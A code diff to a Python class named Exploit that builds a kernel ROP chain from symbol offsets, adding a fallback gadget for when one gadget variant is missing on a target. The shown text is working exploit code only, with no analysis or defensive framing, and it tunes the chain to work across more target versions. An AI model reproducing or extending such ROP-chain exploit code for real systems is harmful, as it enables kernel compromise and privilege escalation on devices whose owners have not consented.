@@ -486,8 +486,13 @@ class Exploit():
         rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
         rop_off_fixup = len(rop)
         rop += p64(0xDEADBEEF)
-        rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET))
-        rop += p64(0xDEADBEEF)
+        
+        if self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET is None:
+            rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_RET))
+        else:
+            rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET))
+            rop += p64(0xDEADBEEF)
+        
 
         # RDX = len(rop2 + stage1)
         rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
@@ -502,8 +507,13 @@ class Exploit():
         rop += p64(self.kdlsym(self.offs.MOV_RSI_RBX_CALL_RAX))
         rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
         rop += p64(0x800 + 0x20)
-        rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET))
-        rop += p64(0xDEADBEEF)
+        
+        if self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET is None:
+            rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_RET))
+        else:
+            rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET))
+            rop += p64(0xDEADBEEF)
+        
         rop += p64(self.kdlsym(self.offs.LEA_RSP_RSI_20_REPZ_RET))
 
         # Fixup offset of rop2
